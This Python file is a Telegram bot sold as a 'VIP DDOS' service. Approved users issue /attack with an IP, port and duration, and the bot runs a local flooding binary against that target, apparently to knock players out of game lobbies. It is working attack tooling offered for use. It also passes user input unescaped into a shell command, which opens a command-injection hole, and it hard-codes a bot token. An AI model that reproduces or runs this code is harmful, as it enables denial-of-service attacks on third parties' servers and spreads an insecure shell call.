import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '7252565213:AAFHkI0-GTCaMa2McvSP1NqBcwqZeXIilr8'
ADMIN_USER_ID = 1342302666
USERS_FILE = 'users.txt'
attack_in_progress = False

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the LEGACY VIP DDOS🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let Start Fucking ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def legacy(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin approval to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /legacy <add|rem> <user_id>*", parse_mode='Markdown')
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if command == 'add':
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} added.*", parse_mode='Markdown')
    elif command == 'rem':
        users.discard(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} removed.*", parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {duration} 20",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our Legacy DDOS Bot!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to be approved to use this bot.*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Another attack is already in progress. Please wait.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args

    # Validate duration
    try:
        duration = int(duration)
        if duration > 120:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Maximum allowed duration is 120 seconds.*", parse_mode='Markdown')
            return
        if duration <= 0:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Duration must be a positive integer.*", parse_mode='Markdown')
            return
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Duration must be a valid integer.*", parse_mode='Markdown')
        return

    await context.bot.send_message(chat_id=chat_id, text=(
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Enjoy And Fuck Whole Lobby 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("legacy", legacy))
    application.add_handler(CommandHandler("attack", attack))
    application.run_polling()

if __name__ == '__main__':
    main()
